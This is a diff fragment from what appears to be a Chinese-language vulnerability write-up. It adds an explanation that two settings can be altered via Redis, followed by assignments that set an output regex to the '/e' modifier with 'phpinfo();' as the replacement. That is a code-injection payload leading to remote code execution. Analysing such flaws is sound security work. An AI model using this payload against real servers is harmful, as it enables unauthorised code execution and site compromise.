@@ -11,3 +11,8 @@ function output_replace($content) {
         return $content;
 }
 ```
+其中，关键点的两个变量我们都可以通过redis修改:
+```
+$_G['setting']['output']['preg']['search']=”/.*/e”;
+$_G['setting']['output']['preg']['replace']=”phpinfo();”;
+```
